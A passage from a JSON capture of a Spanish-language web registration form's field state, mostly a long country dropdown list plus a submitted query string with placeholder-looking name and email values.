Unidos\",\"selected\":false},{\"value\":\"ER\",\"text\":\"Eritrea\",\"selected\":false},{\"value\":\"SK\",\"text\":\"Eslovaquia\",\"selected\":false},{\"value\":\"SI\",\"text\":\"Eslovenia\",\"selected\":false},{\"value\":\"ES\",\"text\":\"Espa\u00f1a\",\"selected\":false},{\"value\":\"US\",\"text\":\"Estados Unidos\",\"selected\":false},{\"value\":\"EE\",\"text\":\"Estonia\",\"selected\":false},{\"value\":\"ET\",\"text\":\"Etiop\u00eda\",\"selected\":false},{\"value\":\"FJ\",\"text\":\"Fiji\",\"selected\":false},{\"value\":\"PH\",\"text\":\"Filipinas\",\"selected\":false},{\"value\":\"FI\",\"text\":\"Finlandia\",\"selected\":false},{\"value\":\"FX\",\"text\":\"Francia Metropolitana\",\"selected\":false},{\"value\":\"FR\",\"text\":\"Francia\",\"selected\":false},{\"value\":\"GA\",\"text\":\"Gab\u00f3n\",\"selected\":false},{\"value\":\"GM\",\"text\":\"Gambia\",\"selected\":false},{\"value\":\"GE\",\"text\":\"Georgia\",\"selected\":false},{\"value\":\"GH\",\"text\":\"Ghana\",\"selected\":false},{\"value\":\"GI\",\"text\":\"Gibraltar\",\"selected\":false},{\"value\":\"GD\",\"text\":\"Granada\",\"selected\":false},{\"value\":\"GR\",\"text\":\"Grecia\",\"selected\":false},{\"value\":\"GL\",\"text\":\"Groenlandia\",\"selected\":false},{\"value\":\"GP\",\"text\":\"Guadalupe\",\"selected\":false},{\"value\":\"GU\",\"text\":\"Guam\",\"selected\":false},{\"value\":\"GT\",\"text\":\"Guatemala\",\"selected\":false},{\"value\":\"GF\",\"text\":\"Guayana Francesa\",\"selected\":false},{\"value\":\"GQ\",\"text\":\"Guinea Ecuatorial\",\"selected\":false},{\"value\":\"GN\",\"text\":\"Guinea\",\"selected\":false},{\"value\":\"GW\",\"text\":\"Guinea-Bissau\",\"selected\":false},{\"value\":\"GY\",\"text\":\"Guyana\",\"selected\":false},{\"value\":\"HT\",\"text\":\"Hait\u00ed\",\"selected\":false},{\"value\":\"HN\",\"text\":\"Honduras\",\"selected\":false},{\"value\":\"HK\",\"text\":\"Hong Kong\",\"selected\":false},{\"value\":\"HU\",\"text\":\"Hungr\u00eda\",\"selected\":false},{\"value\":\"IN\",\"text\":\"India\",\"selected\":false},{\"value\":\"ID\",\"text\":\"Indonesia\",\"selected\":false},{\"value\":\"IQ\",\"text\":\"Irak\",\"selected\":false},{\"value\":\"IR\",\"text\":\"Ir\u00e1n\",\"selected\":false},{\"value\":\"IE\",\"text\":\"Irlanda\",\"selected\":false},{\"value\":\"BV\",\"text\":\"Isla Bouvet\",\"selected\":false},{\"value\":\"CX\",\"text\":\"Isla de Navidad\",\"selected\":false},{\"value\":\"NF\",\"text\":\"Isla Norfolk\",\"selected\":false},{\"value\":\"IS\",\"text\":\"Islandia\",\"selected\":false},{\"value\":\"KY\",\"text\":\"Islas Caim\u00e1n\",\"selected\":false},{\"value\":\"CC\",\"text\":\"Islas Cocos\",\"selected\":false},{\"value\":\"CK\",\"text\":\"Islas Cook\",\"selected\":false},{\"value\":\"FO\",\"text\":\"Islas Feroe\",\"selected\":false},{\"value\":\"GS\",\"text\":\"Islas Georgias del Sur y Sandwich del Sur\",\"selected\":false},{\"value\":\"HM\",\"text\":\"Islas Heard y McDonald\",\"selected\":false},{\"value\":\"FK\",\"text\":\"Islas Malvinas\",\"selected\":false},{\"value\":\"MP\",\"text\":\"Islas Marianas del Norte\",\"selected\":false},{\"value\":\"MH\",\"text\":\"Islas Marshall\",\"selected\":false},{\"value\":\"PN\",\"text\":\"Islas Pitcairn\",\"selected\":false},{\"value\":\"SB\",\"text\":\"Islas Salom\u00f3n\",\"selected\":false},{\"value\":\"TC\",\"text\":\"Islas Turcas y Caicos\",\"selected\":false},{\"value\":\"UM\",\"text\":\"Islas Ultramarinas Menores de Estados Unidos\",\"selected\":false},{\"value\":\"VG\",\"text\":\"Islas V\u00edrgenes Brit\u00e1nicas\",\"selected\":false},{\"value\":\"VI\",\"text\":\"Islas V\u00edrgenes de los Estados Unidos\",\"selected\":false},{\"value\":\"IL\",\"text\":\"Israel\",\"selected\":false},{\"value\":\"IT\",\"text\":\"Italia\",\"selected\":false},{\"value\":\"JM\",\"text\":\"Jamaica\",\"selected\":false},{\"value\":\"JP\",\"text\":\"Jap\u00f3n\",\"selected\":false},{\"value\":\"JO\",\"text\":\"Jordania\",\"selected\":false},{\"value\":\"KZ\",\"text\":\"Kazajist\u00e1n\",\"selected\":false},{\"value\":\"KE\",\"text\":\"Kenia\",\"selected\":false},{\"value\":\"KG\",\"text\":\"Kirguist\u00e1n\",\"selected\":false},{\"value\":\"KI\",\"text\":\"Kiribati\",\"selected\":false},{\"value\":\"KW\",\"text\":\"Kuwait\",\"selected\":false},{\"value\":\"LA\",\"text\":\"Laos\",\"selected\":false},{\"value\":\"LS\",\"text\":\"Lesoto\",\"selected\":false},{\"value\":\"LV\",\"text\":\"Letonia\",\"selected\":false},{\"value\":\"LB\",\"text\":\"L\u00edbano\",\"selected\":false},{\"value\":\"LR\",\"text\":\"Liberia\",\"selected\":false},{\"value\":\"LY\",\"text\":\"Libia\",\"selected\":false},{\"value\":\"LI\",\"text\":\"Liechtenstein\",\"selected\":false},{\"value\":\"LT\",\"text\":\"Lituania\",\"selected\":false},{\"value\":\"LU\",\"text\":\"Luxemburgo\",\"selected\":false},{\"value\":\"MO\",\"text\":\"Macao\",\"selected\":false},{\"value\":\"MG\",\"text\":\"Madagascar\",\"selected\":false},{\"value\":\"MY\",\"text\":\"Malasia\",\"selected\":false},{\"value\":\"MW\",\"text\":\"Malawi\",\"selected\":false},{\"value\":\"MV\",\"text\":\"Maldivas\",\"selected\":false},{\"value\":\"ML\",\"text\":\"Mal\u00ed\",\"selected\":false},{\"value\":\"MT\",\"text\":\"Malta\",\"selected\":false},{\"value\":\"MA\",\"text\":\"Marruecos\",\"selected\":false},{\"value\":\"MQ\",\"text\":\"Martinica\",\"selected\":false},{\"value\":\"MU\",\"text\":\"Mauricio\",\"selected\":false},{\"value\":\"MR\",\"text\":\"Mauritania\",\"selected\":false},{\"value\":\"YT\",\"text\":\"Mayotte\",\"selected\":false},{\"value\":\"MX\",\"text\":\"M\u00e9xico\",\"selected\":false},{\"value\":\"FM\",\"text\":\"Micronesia\",\"selected\":false},{\"value\":\"MD\",\"text\":\"Moldavia\",\"selected\":false},{\"value\":\"MC\",\"text\":\"M\u00f3naco\",\"selected\":false},{\"value\":\"MN\",\"text\":\"Mongolia\",\"selected\":false},{\"value\":\"ME\",\"text\":\"Montenegro\",\"selected\":false},{\"value\":\"MS\",\"text\":\"Montserrat\",\"selected\":false},{\"value\":\"MZ\",\"text\":\"Mozambique\",\"selected\":false},{\"value\":\"MM\",\"text\":\"Myanmar\",\"selected\":false},{\"value\":\"NA\",\"text\":\"Namibia\",\"selected\":false},{\"value\":\"NR\",\"text\":\"Nauru\",\"selected\":false},{\"value\":\"NP\",\"text\":\"Nepal\",\"selected\":false},{\"value\":\"NI\",\"text\":\"Nicaragua\",\"selected\":false},{\"value\":\"NE\",\"text\":\"N\u00edger\",\"selected\":false},{\"value\":\"NG\",\"text\":\"Nigeria\",\"selected\":false},{\"value\":\"NU\",\"text\":\"Niue\",\"selected\":false},{\"value\":\"NO\",\"text\":\"Noruega\",\"selected\":false},{\"value\":\"NC\",\"text\":\"Nueva Caledonia\",\"selected\":false},{\"value\":\"NZ\",\"text\":\"Nueva Zelanda\",\"selected\":false},{\"value\":\"OM\",\"text\":\"Om\u00e1n\",\"selected\":false},{\"value\":\"NL\",\"text\":\"Pa\u00edses Bajos\",\"selected\":false},{\"value\":\"PK\",\"text\":\"Pakist\u00e1n\",\"selected\":false},{\"value\":\"PW\",\"text\":\"Palaos\",\"selected\":false},{\"value\":\"PS\",\"text\":\"Palestina\",\"selected\":false},{\"value\":\"PA\",\"text\":\"Panam\u00e1\",\"selected\":false},{\"value\":\"PG\",\"text\":\"Pap\u00faa Nueva Guinea\",\"selected\":false},{\"value\":\"PY\",\"text\":\"Paraguay\",\"selected\":false},{\"value\":\"PE\",\"text\":\"Per\u00fa\",\"selected\":false},{\"value\":\"PF\",\"text\":\"Polinesia Francesa\",\"selected\":false},{\"value\":\"PL\",\"text\":\"Polonia\",\"selected\":false},{\"value\":\"PT\",\"text\":\"Portugal\",\"selected\":false},{\"value\":\"PR\",\"text\":\"Puerto Rico\",\"selected\":false},{\"value\":\"QA\",\"text\":\"Qatar\",\"selected\":false},{\"value\":\"GB\",\"text\":\"Reino Unido\",\"selected\":false},{\"value\":\"CF\",\"text\":\"Rep\u00fablica Centroafricana\",\"selected\":false},{\"value\":\"CZ\",\"text\":\"Rep\u00fablica Checa\",\"selected\":false},{\"value\":\"MK\",\"text\":\"Rep\u00fablica de Macedonia\",\"selected\":false},{\"value\":\"CG\",\"text\":\"Rep\u00fablica del Congo\",\"selected\":false},{\"value\":\"CD\",\"text\":\"Rep\u00fablica Democr\u00e1tica del Congo\",\"selected\":false},{\"value\":\"DO\",\"text\":\"Rep\u00fablica Dominicana\",\"selected\":false},{\"value\":\"RE\",\"text\":\"Reuni\u00f3n\",\"selected\":false},{\"value\":\"RW\",\"text\":\"Ruanda\",\"selected\":false},{\"value\":\"RO\",\"text\":\"Ruman\u00eda\",\"selected\":false},{\"value\":\"RU\",\"text\":\"Rusia\",\"selected\":false},{\"value\":\"EH\",\"text\":\"Sahara Occidental\",\"selected\":false},{\"value\":\"AS\",\"text\":\"Samoa Americana\",\"selected\":false},{\"value\":\"WS\",\"text\":\"Samoa\",\"selected\":false},{\"value\":\"KN\",\"text\":\"San Crist\u00f3bal y Nieves\",\"selected\":false},{\"value\":\"SM\",\"text\":\"San Marino\",\"selected\":false},{\"value\":\"PM\",\"text\":\"San Pedro y Miquel\u00f3n\",\"selected\":false},{\"value\":\"VC\",\"text\":\"San Vicente y las Granadinas\",\"selected\":false},{\"value\":\"SH\",\"text\":\"Santa Helena\",\"selected\":false},{\"value\":\"LC\",\"text\":\"Santa Luc\u00eda\",\"selected\":false},{\"value\":\"ST\",\"text\":\"Santo Tom\u00e9 y Pr\u00edncipe\",\"selected\":false},{\"value\":\"SN\",\"text\":\"Senegal\",\"selected\":false},{\"value\":\"RS\",\"text\":\"Serbia\",\"selected\":false},{\"value\":\"SC\",\"text\":\"Seychelles\",\"selected\":false},{\"value\":\"SL\",\"text\":\"Sierra Leona\",\"selected\":false},{\"value\":\"SG\",\"text\":\"Singapur\",\"selected\":false},{\"value\":\"SY\",\"text\":\"Siria\",\"selected\":false},{\"value\":\"SO\",\"text\":\"Somalia\",\"selected\":false},{\"value\":\"LK\",\"text\":\"Sri Lanka\",\"selected\":false},{\"value\":\"SZ\",\"text\":\"Suazilandia\",\"selected\":false},{\"value\":\"ZA\",\"text\":\"Sud\u00e1frica\",\"selected\":false},{\"value\":\"SD\",\"text\":\"Sud\u00e1n\",\"selected\":false},{\"value\":\"SE\",\"text\":\"Suecia\",\"selected\":false},{\"value\":\"CH\",\"text\":\"Suiza\",\"selected\":false},{\"value\":\"SR\",\"text\":\"Surinam\",\"selected\":false},{\"value\":\"SJ\",\"text\":\"Svalbard y Jan Mayen\",\"selected\":false},{\"value\":\"TH\",\"text\":\"Tailandia\",\"selected\":false},{\"value\":\"TW\",\"text\":\"Taiw\u00e1n\",\"selected\":false},{\"value\":\"TZ\",\"text\":\"Tanzania\",\"selected\":false},{\"value\":\"TJ\",\"text\":\"Tayikist\u00e1n\",\"selected\":false},{\"value\":\"IO\",\"text\":\"Territorio Brit\u00e1nico del Oc\u00e9ano \u00cdndico\",\"selected\":false},{\"value\":\"TF\",\"text\":\"Territorios Australes y Ant\u00e1rticos Franceses\",\"selected\":false},{\"value\":\"TP\",\"text\":\"Timor Oriental\",\"selected\":false},{\"value\":\"TG\",\"text\":\"Togo\",\"selected\":false},{\"value\":\"TK\",\"text\":\"Tokelau\",\"selected\":false},{\"value\":\"TO\",\"text\":\"Tonga\",\"selected\":false},{\"value\":\"TT\",\"text\":\"Trinidad y Tobago\",\"selected\":false},{\"value\":\"TN\",\"text\":\"T\u00fanez\",\"selected\":false},{\"value\":\"TM\",\"text\":\"Turkmenist\u00e1n\",\"selected\":false},{\"value\":\"TR\",\"text\":\"Turqu\u00eda\",\"selected\":false},{\"value\":\"TV\",\"text\":\"Tuvalu\",\"selected\":false},{\"value\":\"UA\",\"text\":\"Ucrania\",\"selected\":false},{\"value\":\"UG\",\"text\":\"Uganda\",\"selected\":false},{\"value\":\"UY\",\"text\":\"Uruguay\",\"selected\":false},{\"value\":\"UZ\",\"text\":\"Uzbekist\u00e1n\",\"selected\":false},{\"value\":\"VU\",\"text\":\"Vanuatu\",\"selected\":false},{\"value\":\"VE\",\"text\":\"Venezuela\",\"selected\":false},{\"value\":\"VN\",\"text\":\"Vietnam\",\"selected\":false},{\"value\":\"WF\",\"text\":\"Wallis y Futuna\",\"selected\":false},{\"value\":\"YE\",\"text\":\"Yemen\",\"selected\":false},{\"value\":\"DJ\",\"text\":\"Yibuti\",\"selected\":false},{\"value\":\"ZM\",\"text\":\"Zambia\",\"selected\":false},{\"value\":\"ZW\",\"text\":\"Zimbabue\",\"selected\":false}]", "defaultValue": "", "modified": false}, {"Type": "text", "name": "nif", "value": "", "modified": false}, {"Type": "text", "name": "company", "value": "", "modified": false}, {"Type": "select-one", "name": "userLang", "value": "[{\"value\":\"ES\",\"text\":\"Espa\u00f1ol\",\"selected\":false},{\"value\":\"EN\",\"text\":\"English\",\"selected\":false},{\"value\":\"PT\",\"text\":\"Portugu\u00eas\",\"selected\":false},{\"value\":\"DE\",\"text\":\"Deutsch\",\"selected\":true}]", "defaultValue": "DE", "modified": false}, {"Type": "checkbox", "name": "communicationsAllowed", "value": "true", "defaultValue": "", "pattern": "", "checked": true, "modified": false}], "queryForm": "authenticityToken=142181d316d0e21f9b7c9516e2af197d47542d60&name=Paco&notificationEmail=zdmgserhirlffhvyya@awdrt.org&address=&country=[{\"value\":\"\",\"text\":\"\",\"selected\":true},{\"value\":\"EMPTY\",\"text\":\"Pa\u00eds\",\"selected\":false},{\"value\":\"AF\",\"text\":\"Afganist\u00e1n\",\"selected\":false},{\"value\":\"AL\",\"text\":\"Albania\",\"selected\":false},{\"value\":\"DE\",\"text\":\"Alemania\",\"selected\":false},{\"value\":\"AD\",\"text\":\"Andorra\",\"selected\":false},{\"value\":\"AO\",\"text\":\"Angola\",\"selected\":false},{\"value\":\"AI\",\"text\":\"Anguila\",\"selected\":false},{\"value\":\"AQ\",\"text\":\"Ant\u00e1rtida\",\"selected\":false},{\"value\":\"AG\",\"text\":\"Antigua y Barbuda\",\"selected\":false},{\"value\":\"AN\",\"text\":\"Antillas Neerlandesas\",\"selected\":false},{\"value\":\"SA\",\"text\":\"Arabia Saudita\",\"selected\":false},{\"value\":\"DZ\",\"text\":\"Argelia\",\"selected\":false},{\"value\":\"AR\",\"text\":\"Argentina\",\"selected\":false},{\"value\":\"AM\",\"text\":\"Armenia\",\"selected\":false},{\"value\":\"AW\",\"text\":\"Aruba\",\"selected\":false},{\"value\":\"AU\",\"text\":\"Australia\",\"selected\":false},{\"value\":\"AT\",\"text\":\"Austria\",\"selected\":false},{\"value\":\"AZ\",\"text\":\"Azerbaiy\u00e1n\",\"selected\":false},{\"value\":\"BS\",\"text\":\"Bahamas\",\"selected\":false},{\"value\":\"BD\",\"text\":\"Bangladesh\",\"selected\":false},{\"value\":\"BB\",\"text\":\"Barbados\",\"selected\":false},{\"value\":\"BH\",\"text\":\"Bahr\u00e9in\",\"selected\":false},{\"value\":\"BE\",\"text\":\"B\u00e9lgica\",\"selected\":false},{\"value\":\"BZ\",\"text\":\"Belice\",\"selected\":false},{\"value\":\"BJ\",\"text\":\"Ben\u00edn\",\"selected\":false},{\"value\":\"BM\",\"text\":\"Bermudas\",\"selected\":false},{\"value\":\"BY\",\"text\":\"Bielorrusia\",\"selected\":false},{\"value\":\"BO\",\"text\":\"Bolivia\",\"selected\":false},{\"value\":\"BA\",\"text\":\"Bosnia-Herzegovina\",\"selected\":false},{\"value\":\"BW\",\"text\":\"Botsuana\",\"selected\":false},{\"value\":\"BR\",\"text\":\"Brasil\",\"selected\":false},{\"value\":\"BN\",\"text\":\"Brunei\",\"selected\":false},{\"value\":\"BG\",\"text\":\"Bulgaria\",\"selected\":false},{\"value\":\"BF\",\"text\":\"Burkina Faso\",\"selected\":false},{\"value\":\"BI\",\"text\":\"Burundi\",\"selected\":false},{\"value\":\"BT\",\"text\":\"But\u00e1n\",\"selected\":false},{\"value\":\"CV\",\"text\":\"Cabo Verde\",\"selected\":false},{\"value\":\"KH\",\"text\":\"Camboya\",\"selected\":false},{\"value\":\"CM\",\"text\":\"Camer\u00fan\",\"selected\":false},{\"value\":\"CA\",\"text\":\"Canad\u00e1\",\"selected\":false},{\"value\":\"TD\",\"text\":\"Chad\",\"selected\":false},{\"value\":\"CL\",\"text\":\"Chile\",\"selected\":false},{\"value\":\"CN\",\"text\":\"China\",\"selected\":false},{\"value\":\"CY\",\"text\":\"Chipre\",\"selected\":false},{\"value\":\"VA\",\"text\":\"Ciudad del Vaticano\",\"selected\":false},{\"value\":\"CO\",\"text\":\"Colombia\",\"selected\":false},{\"value\":\"KM\",\"text\":\"Comoras\",\"selected\":false},{\"value\":\"KP\",\"text\":\"Corea del Norte\",\"selected\":false},{\"value\":\"KR\",\"text\":\"Corea del Sur\",\"selected\":false},{\"value\":\"CI\",\"text\":\"Costa de Marfil\",\"selected\":false},{\"value\":\"CR\",\"text\":\"Costa Rica\",\"selected\":false},{\"value\":\"HR\",\"text\":\"Croacia\",\"selected\":false},{\"value\":\"CU\",\"text\":\"Cuba\",\"selected\":false},{\"value\":\"DK\",\"text\":\"Dinamarca\",\"selected\":false},{\"value\":\"DM\",\"text\":\"Dominica\",\"selected\":false},{\"value\":\"EC\",\"text\":\"Ecuador\",\"selected\":false},{\"value\":\"EG\",\"text\":\"Egipto\",\"selected\":false},{\"value\":\"SV\",\"text\":\"El Salvador\",\"selected\":false},{\"value\":\"AE\",\"text\":\"Emiratos \u00c1rabes Unidos\",\"selected\":false},{\"value\":\"ER\",\"text\":\"Eritrea\",\"selected\":false},{\"value\":\"SK\",\"text\":\"Eslovaquia\",\"selected\":false},{\"value\":\"SI\",\"text\":\"Eslovenia\",\"selected\":false},{\"value\":\"ES\",\"text\":\"Espa\u00f1a\",\"selected\":false},{\"value\":\"US\",\"text\":\"Estados Unidos\",\"selected\":false},{\"value\":\"EE\",\"text\":\"Estonia\",\"selected\":false},{\"value\":\"ET\",\"text\":\"Etiop\u00eda\",\"selected\":false},{\"value\":\"FJ\",\"text\":\"Fiji\",\"selected\":false},{\"value\":\"PH\",\"text\":\"Filipinas\",\"selected\":false},{\"value\":\"FI\",\"text\":\"Finlandia\",\"selected\":false},{\"value\":\"FX\",\"text\":\"Francia Metropolitana\",\"selected\":false},{\"value\":\"FR\",\"text\":\"Francia\",\"selected\":false},{\"value\":\"GA\",\"text\":\"Gab\u00f3n\",\"selected\":false},{\"value\":\"GM\",\"text\":\"Gambia\",\"selected\":false},{\"value\":\"GE\",\"text\":\"Georgia\",\"selected\":false},{\"value\":\"GH\",\"text\":\"Ghana\",\"selected\":false},{\"value\":\"GI\",\"text\":\"Gibraltar\",\"selected\":false},{\"value\":\"GD\",\"text\":\"Granada\",\"selected\":false},{\"value\":\"GR\",\"text\":\"Grecia\",\"selected\":false},{\"value\":\"GL\",\"text\":\"Groenlandia\",\"selected\":false},{\"value\":\"GP\",\"text\":\"Guadalupe\",\"selected\":false},{\"value\":\"GU\",\"text\":\"Guam\",\"selected\":false},{\"value\":\"GT\",\"text\":\"Guatemala\",\"selected\":false},{\"value\":\"GF\",\"text\":\"Guayana Francesa\",\"selected\":false},{\"value\":\"GQ\",\"text\":\"Guinea Ecuatorial\",\"selected\":false},{\"value\":\"GN\",\"text\":\"Guinea\",\"selected\":false},{\"value\":\"GW\",\"text\":\"Guinea-Bissau\",\"selected\":false},{\"value\":\"GY\",\"text\":\"Guyana\",\"selected\":false},{\"value\":\"HT\",\"text\":\"Hait\u00ed\",\"selected\":false},{\"value\":\"HN\",\"text\":\"Honduras\",\"selected\":false},{\"value\":\"HK\",\"text\":\"Hong Kong\",\"selected\":false},{\"value\":\"HU\",\"text\":\"Hungr\u00eda\",\"selected\":false},{\"value\":\"IN\",\"text\":\"India\",\"selected\":false},{\"value\":\"ID\",\"text\":\"Indonesia\",\"selected\":false},{\"value\":\"IQ\",\"text\":\"Irak\",\"selected\":false},{\"value\":\"IR\",\"text\":\"Ir\u00e1n\",\"selected\":false},{\"value\":\"IE\",\"text\":\"Irlanda\",\"selected\":false},{\"value\":\"BV\",\"text\":\"Isla Bouvet\",\"selected\":false},{\"value\":\"CX\",\"text\":\"Isla de Navidad\",\"selected\":false},{\"value\":\"NF\",\"text\":\"Isla Norfolk\",\"selected\":false},{\"value\":\"IS\",\"text\":\"Islandia\",\"selected\":false},{\"value\":\"KY\",\"text\":\"Islas Caim\u00e1n\",\"selected\":false},{\"value\":\"CC\",\"text\":\"Islas Cocos\",\"selected\":false},{\"value\":\"CK\",\"text\":\"Islas Cook\",\"selected\":false},{\"value\":\"FO\",\"text\":\"Islas Feroe\",\"selected\":false},{\"value\":\"GS\",\"text\":\"Islas Georgias del Sur y Sandwich del Sur\",\"selected\":false},{\"value\":\"HM\",\"text\":\"Islas Heard y McDonald\",\"selected\":false},{\"value\":\"FK\",\"text\":\"Islas Malvinas\",\"selected\":false},{\"value\":\"MP\",\"text\":\"Islas Marianas del Norte\",\"selected\":false},{\"value\":\"MH\",\"text\":\"Islas Marshall\",\"selected\":false},{\"value\":\"PN\",\"text\":\"Islas Pitcairn\",\"selected\":false},{\"value\":\"SB\",\"text\":\"Islas Salom\u00f3n\",\"selected\":false},{\"value\":\"TC\",\"text\":\"Islas Turcas y Caicos\",\"selected\":false},{\"value\":\"UM\",\"text\":\"Islas Ultramarinas Menores de Estados Unidos\",\"selected\":false},{\"value\":\"VG\",\"text\":\"Islas V\u00edrgenes Brit\u00e1nicas\",\"selected\":false},{\"value\":\"VI\",\"text\":\"Islas V\u00edrgenes de los Estados Unidos\",\"selected\":false},{\"value\":\"IL\",\"text\":\"Israel\",\"selected\":false},{\"value\":\"IT\",\"text\":\"Italia\",\"selected\":false},{\"value\":\"JM\",\"text\":\"Jamaica\",\"selected\":false},{\"value\":\"JP\",\"text\":\"Jap\u00f3n\",\"selected\":false},{\"value\":\"JO\",\"text\":\"Jordania\",\"selected\":false},{\"value\":\"KZ\",\"text\":\"Kazajist\u00e1n\",\"selected\":false},{\"value\":\"KE\",\"text\":\"Kenia\",\"selected\":false},{\"value\":\"KG\",\"text\":\"Kirguist\u00e1n\",\"selected\":false},{\"value\":\"KI\",\"text\":\"Kiribati\",\"selected\":false},{\"value\":\"KW\",\"text\":\"Kuwait\",\"selected\":false},{\"value\":\"LA\",\"text\":\"Laos\",\"selected\":false},{\"value\":\"LS\",\"text\":\"Lesoto\",\"selected\":false},{\"value\":\"LV\",\"text\":\"Letonia\",\"selected\":false},{\"value\":\"LB\",\"text\":\"L\u00edbano\",\"selected\":false},{\"value\":\"LR\",\"text\":\"Liberia\",\"selected\":false},{\"value\":\"LY\",\"text\":\"Libia\",\"selected\":false},{\"value\":\"LI\",\"text\":\"Liechtenstein\",\"selected\":false},{\"value\":\"LT\",\"text\":\"Lituania\",\"selected\":false},{\"value\":\"LU\",\"text\":\"Luxemburgo\",\"selected\":false},{\"value\":\"MO\",\"text\":\"Macao\",\"selected\":false},{\"value\":\"MG\",\"text\":\"Madagascar\",\"selected\":false},{\"value\":\"MY\",\"text\":\"Malasia\",\"selected\":false},{\"value\":\"MW\",\"text\":\"Malawi\",\"selected\":false},{\"value\":\"MV\",\"text\":\"Maldivas\",\"selected\":false},{\"value\":\"ML\",\"text\":\"Mal\u00ed\",\"selected\":false},{\"value\":\"MT\",\"text\":\"Malta\",\"selected\":false},{\"value\":\"MA\",\"text\":\"Marruecos\",\"selected\":false},{\"value\":\"MQ\",\"text\":\"Martinica\",\"selected\":false},{\"value\":\"MU\",\"text\":\"Mauricio\",\"selected\":false},{\"value\":\"MR\",\"text\":\"Mauritania\",\"selected\":false},{\"value\":\"YT\",\"text\":\"Mayotte\",\"selected\":false},{\"value\":\"MX\",\"text\":\"M\u00e9xico\",\"selected\":false},{\"value\":\"FM\",\"text\":\"Micronesia\",\"selected\":false},{\"value\":\"MD\",\"text\":\"Moldavia\",\"selected\":false},{\"value\":\"MC\",\"text\":\"M\u00f3naco\",\"selected\":false},{\"value\":\"MN\",\"text\":\"Mongolia\",\"selected\":false},{\"value\":\"ME\",\"text\":\"Montenegro\",\"selected\":false},{\"value\":\"MS\",\"text\":\"Montserrat\",\"selected\":false},{\"value\":\"MZ\",\"text\":\"Mozambique\",\"selected\":false},{\"value\":\"MM\",\"text\":\"Myanmar\",\"selected\":false},{\"value\":\"NA\",\"text\":\"Namibia\",\"selected\":false},{\"value\":\"NR\",\"text\":\"Nauru\",\"selected\":false},{\"value\":\"NP\",\"text\":\"Nepal\",\"selected\":false},{\"value\":\"NI\",\"text\":\"Nicaragua\",\"selected\":false},{\"value\":\"NE\",\"text\":\"N\u00edger\",\"selected\":false},{\"value\":\"NG\",\"text\":\"Nigeria\",\"selected\":false},{\"value\":\"NU\",\"text\":\"Niue\",\"selected\":false},{\"value\":\"NO\",\"text\":\"Noruega\",\"selected\":false},{\"value\":\"NC\",\"text\":\"Nueva Caledonia\",\"selected\":false},{\"value\":\"NZ\",\"text\":\"Nueva Zelanda\",\"selected\":false},{\"value\":\"OM\",\"text\":\"Om\u00e1n\",\"selected\":false},{\"value\":\"NL\",\"text\":\"Pa\u00edses Bajos\",\"selected\":false},{\"value\":\"PK\",\"text\":\"Pakist\u00e1n\",\"selected\":false},{\"value\":\"PW\",\"text\":\"Palaos\",\"selected\":false},{\"value\":\"PS\",\"text\":\"Palestina\",\"selected\":false},{\"value\":\"PA\",\"text\":\"Panam\u00e1\",\"selected\":false},{\"value\":\"PG\",\"text\":\"Pap\u00faa Nueva Guinea\",\"selected\":false},{\"value\":\"PY\",\"text\":\"Paraguay\",\"selected\":false},{\"value\":\"PE\",\"text\":\"Per\u00fa\",\"selected\":false},{\"value\":\"PF\",\"text\":\"Polinesia Francesa\",\"selected\":false},{\"value\":\"PL\",\"text\":\"Polonia\",\"selected\":false},{\"value\":\"PT\",\"text\":\"Portugal\",\"selected\":false},{\"value\":\"PR\",\"text\":\"Puerto Rico\",\"selected\":false},{\"value\":\"QA\",\"text\":\"Qatar\",\"selected\":false},{\"value\":\"GB\",\"text\":\"Reino Unido\",\"selected\":false},{\"value\":\"CF\",\"text\":\"Rep\u00fablica Centroafricana\",\"selected\":false},{\"value\":\"CZ\",\"text\":\"Rep\u00fablica Checa\",\"selected\":false},{\"value\":\"MK\",\"text\":\"Rep\u00fablica de Macedonia\",\"selected\":false},{\"value\":\"CG\",\"text\":\"Rep\u00fablica del Congo\",\"selected\":false},{\"value\":\"CD\",\"text\":\"Rep\u00fablica Democr\u00e1tica del Congo\",\"selected\":false},{\"value\":\"DO\",\"text\":\"Rep\u00fablica Dominicana\",\"selected\":false},{\"value\":\"RE\",\"text\":\"Reuni\u00f3n\",\"selected\":false},{\"value\":\"RW\",\"text\":\"Ruanda\",\"selected\":false},{\"value\":\"RO\",\"text\":\"Ruman\u00eda\",\"selected\":false},{\"value\":\"RU\",\"text\":\"Rusia\",\"selected\":false},{\"value\":\"EH\",\"text\":\"Sahara Occidental\",\"selected\":false},{\"value\":\"AS\",\"text\":\"Samoa Americana\",\"selected\":false},{\"value\":\"WS\",\"text\":\"Samoa\",\"selected\":false},{\"value\":\"KN\",\"text\":\"San Crist\u00f3bal y Nieves\",\"selected\":false},{\"value\":\"SM\",\"text\":\"San Marino\",\"selected\":false},{\"value\":\"PM\",\"text\":\"San Pedro y Miquel\u00f3n\",\"selected\":false},{\"value\":\"VC\",\"text\":\"San Vicente y las Granadinas\",\"selected\":false},{\"value\":\"SH\",\"text\":\"Santa Helena\",\"selected\":false},{\"value\":\"LC\",\"text\":\"Santa Luc\u00eda\",\"selected\":false},{\"value\":\"ST\",\"text\":\"Santo Tom\u00e9 y Pr\u00edncipe\",\"selected\":false},{\"value\":\"SN\",\"text\":\"Senegal\",\"selected\":false},{\"value\":\"RS\",\"text\":\"Serbia\",\"selected\":false},{\"value\":\"SC\",\"text\":\"Seychelles\",\"selected\":false},{\"value\":\"SL\",\"text\":\"Sierra Leona\",\"selected\":false},{\"value\":\"SG\",\"text\":\"Singapur\",\"selected\":false},{\"value\":\"SY\",\"text\":\"Siria\",\"selected\":false},{\"value\":\"SO\",\"text\":\"Somalia\",\"selected\":false},{\"value\":\"LK\",\"text\":\"Sri Lanka\",\"selected\":false},{\"value\":\"SZ\",\"text\":\"Suazilandia\",\"selected\":false},{\"value\":\"ZA\",\"text\":\"Sud\u00e1frica\",\"selected\":false},{\"value\":\"SD\",\"text\":\"Sud\u00e1n\",\"selected\":false},{\"value\":\"SE\",\"text\":\"Suecia\",\"selected\":false},{\"value\":\"CH\",\"text\":\"Suiza\",\"selected\":false},{\"value\":\"SR\",\"text\":\"Surinam\",\"selected\":false},{\"value\":\"SJ\",\"text\":\"Svalbard y Jan Mayen\",\"selected\":false},{\"value\":\"TH\",\"text\":\"Tailandia\",\"selected\":false},{\"value\":\"TW\",\"text\":\"Taiw\u00e1n\",\"selected\":false},{\"value\":\"TZ\",\"text\":\"Tanzania\",\"selected\":false},{\"value\":\"TJ\",\"text\":\"Tayikist\u00e1n\",\"selected\":false},{\"value\":\"IO\",\"text\":\"Territorio 